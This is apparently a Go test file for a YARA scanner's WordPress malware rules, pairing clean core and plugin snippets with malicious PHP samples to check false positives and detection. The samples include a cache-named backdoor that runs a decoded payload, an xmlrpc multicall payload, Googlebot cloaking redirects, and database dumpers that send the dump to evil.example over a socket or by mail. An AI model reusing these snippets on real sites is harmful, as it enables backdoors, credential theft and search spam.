//go:build yara

package yara

import (
	"strings"
	"testing"
)

// FP reconstruction for the 2026-06-16 forensic sweep: backdoor_iconcache_disguise
// matched a clean WordPress core wp-settings.php. The file references
// advanced-cache.php (trips the icon/cache filename string) and carries
// "$_REQUEST ( $_GET + $_POST )" in a comment (trips the variable-dispatch
// string), but contains no decoder and no dangerous exec. A clean core file
// must never match.
func TestBackdoorIconcacheDisguise_WPSettingsCoreIsNotBackdoor(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	legit := []byte(`<?php
// Add magic quotes and set up $_REQUEST ( $_GET + $_POST ).
wp_magic_quotes();

// Load the advanced-cache.php drop-in if WP_CACHE is enabled.
if ( WP_CACHE && file_exists( WP_CONTENT_DIR . '/advanced-cache.php' ) ) {
	include WP_CONTENT_DIR . '/advanced-cache.php';
}
$GLOBALS['wp_the_query'] = new WP_Query();
`)
	if hasYaraRule(scanner.ScanBytes(legit), "backdoor_iconcache_disguise") {
		t.Error("backdoor_iconcache_disguise FP: matched clean core wp-settings.php (cache.php reference + dispatch-in-comment, no decoder)")
	}
}

func TestBackdoorIconcacheDisguise_UnrelatedDecoderDoesNotJoinCoreTokens(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	legit := []byte(`<?php
$decoded = base64_decode( $stored_option );
` + strings.Repeat("// benign plugin setup padding\n", 32) + `
// Add magic quotes and set up $_REQUEST ( $_GET + $_POST ).
wp_magic_quotes();

// Load the advanced-cache.php drop-in if WP_CACHE is enabled.
if ( WP_CACHE && file_exists( WP_CONTENT_DIR . '/advanced-cache.php' ) ) {
	include WP_CONTENT_DIR . '/advanced-cache.php';
}
`)
	if hasYaraRule(scanner.ScanBytes(legit), "backdoor_iconcache_disguise") {
		t.Error("backdoor_iconcache_disguise FP: matched benign cache-name/comment tokens because an unrelated decoder appeared elsewhere")
	}
}

// Real disguise: a cache-named file that dispatches a decoded payload through a
// variable function. The disguise arm (filename + variable dispatch + decoder)
// must keep firing.
func TestBackdoorIconcacheDisguise_DisguisedDispatchDecoderDetected(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	malicious := []byte(`<?php
// dropped as object-cache.php
$fn = $_GET['f'];
$payload = gzinflate( base64_decode( $_POST['x'] ) );
$fn ( $payload );
`)
	if !hasYaraRule(scanner.ScanBytes(malicious), "backdoor_iconcache_disguise") {
		t.Error("backdoor_iconcache_disguise regression: cache-disguised variable dispatch of a decoded payload was not detected")
	}
}

func TestExploitWPXmlrpcYARA_DisablingPluginIsNotAttack(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	legit := []byte(`<?php
// Site Enhancements: harden xmlrpc.php against amplification.
add_filter( 'xmlrpc_methods', function ( $methods ) {
	unset( $methods['system.multicall'] );
	return $methods;
} );
`)
	if hasYaraRule(scanner.ScanBytes(legit), "exploit_wp_xmlrpc_abuse") {
		t.Error("exploit_wp_xmlrpc_abuse YARA FP: matched a plugin that disables xmlrpc without a method-call payload")
	}
}

func TestExploitWPXmlrpcYARA_MulticallPayloadDetected(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	malicious := []byte(`<?php
$url = 'http://victim.example/xmlrpc.php';
$body = '<?xml version="1.0"?><methodCall><methodName>system.multicall</methodName>'
	. '<params><param><value><array><data></data></array></value></param></params></methodCall>';
`)
	if !hasYaraRule(scanner.ScanBytes(malicious), "exploit_wp_xmlrpc_abuse") {
		t.Error("exploit_wp_xmlrpc_abuse YARA regression: system.multicall payload was not detected")
	}
}

func TestSpamConditionalGooglebotYARA_WordfenceCrawlVerifyIsNotCloaking(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	legit := []byte(`<?php
class wfCrawl {
	public static function isGoogleCrawler( $userAgent = null ) {
		if ( $userAgent === null ) {
			$userAgent = $_SERVER['HTTP_USER_AGENT'];
		}
		if ( ! preg_match( '/Googlebot\/\d\.\d/', $userAgent ) ) {
			return false;
		}
		$host = gethostbyaddr( $_SERVER['REMOTE_ADDR'] );
		return (bool) preg_match( '/\.googlebot\.com$/i', $host );
	}
}
`)
	if hasYaraRule(scanner.ScanBytes(legit), "spam_conditional_googlebot") {
		t.Error("spam_conditional_googlebot YARA FP: matched Wordfence crawler verification (UA + reverse DNS, no content cloaking)")
	}
}

func TestSpamConditionalGooglebotYARA_RedirectCloakingDetected(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	malicious := []byte(`<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if ( stripos( $ua, 'Googlebot' ) !== false ) {
	header( 'Location: http://spam.example/cloak/' );
	exit;
}
`)
	if !hasYaraRule(scanner.ScanBytes(malicious), "spam_conditional_googlebot") {
		t.Error("spam_conditional_googlebot YARA regression: Googlebot-conditional redirect cloaking was not detected")
	}
}

func TestSpamConditionalGooglebotYARA_PreparedContentCloakingDetected(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	malicious := []byte(`<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if ( stristr( $ua, 'Googlebot' ) ) {
	$page = file_get_contents( 'http://spam.example/links.php' );
	print $page;
	exit;
}
`)
	if !hasYaraRule(scanner.ScanBytes(malicious), "spam_conditional_googlebot") {
		t.Error("spam_conditional_googlebot YARA regression: Googlebot cloak with a prepared response before output was not detected")
	}
}

func TestExfilWpDbDumperYARA_MainWPLocalBackupIsNotExfil(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	legit := []byte(`<?php
// MainWP child: create a local database backup archive.
class MainWP_Child_DB_Backup {
	public function dump( $database_name, $user, $pass, $host, $gzip_full_path ) {
		// wp-config.php is excluded from the file archive; the DB is dumped separately.
		exec( "mysqldump --user={$user} --password='{$pass}' --host={$host} {$database_name} | gzip > {$gzip_full_path}", $output, $result );
		return $result;
	}
}
`)
	if hasYaraRule(scanner.ScanBytes(legit), "exfil_wp_db_dumper") {
		t.Error("exfil_wp_db_dumper YARA FP: matched MainWP local backup (mysqldump to a local gzip file, no exfil sink)")
	}
}

func TestExfilWpDbDumperYARA_LocalBackupManifestWriteIsNotExfil(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	legit := []byte(`<?php
// Backup job: wp-config.php is excluded from the file archive.
exec( "mysqldump --user={$user} --password='{$pass}' wordpress | gzip > {$gzip_full_path}", $output, $result );
$fh = fopen( '/tmp/backup-manifest.txt', 'wb' );
fwrite( $fh, "database backup complete" );
fclose( $fh );
`)
	if hasYaraRule(scanner.ScanBytes(legit), "exfil_wp_db_dumper") {
		t.Error("exfil_wp_db_dumper YARA FP: matched local backup metadata fwrite with no network or response exfil sink")
	}
}

func TestExfilWpDbDumperYARA_ConfigReadLocalDumpDetected(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	malicious := []byte(`<?php
$cfg = file_get_contents( ABSPATH . '/wp-config.php' );
system ( "mysqldump -u root -psecret wordpress > /tmp/local.sql" );
`)
	if !hasYaraRule(scanner.ScanBytes(malicious), "exfil_wp_db_dumper") {
		t.Error("exfil_wp_db_dumper YARA regression: wp-config file read followed by a local mysqldump was not detected")
	}
}

func TestExfilWpDbDumperYARA_SocketWriteDetected(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	malicious := []byte(`<?php
// wp-config.php tells the dropper which local database to steal.
$sock = stream_socket_client( 'tcp://evil.example:4444' );
system( "mysqldump -u root -psecret wordpress > /tmp/d.sql" );
fwrite( $sock, file_get_contents( '/tmp/d.sql' ) );
`)
	if !hasYaraRule(scanner.ScanBytes(malicious), "exfil_wp_db_dumper") {
		t.Error("exfil_wp_db_dumper YARA regression: dump sent through a socket write was not detected")
	}
}

func TestExfilWpDbDumperYARA_DumpAndMailDetected(t *testing.T) {
	scanner := loadRepoYaraScanner(t)

	malicious := []byte(`<?php
$cfg = file_get_contents( 'wp-config.php' );
system( "mysqldump -u root -psecret wordpress > /tmp/d.sql" );
mail( 'attacker@evil.example', 'db', file_get_contents( '/tmp/d.sql' ) );
`)
	if !hasYaraRule(scanner.ScanBytes(malicious), "exfil_wp_db_dumper") {
		t.Error("exfil_wp_db_dumper YARA regression: dump-then-mail credential theft was not detected")
	}
}
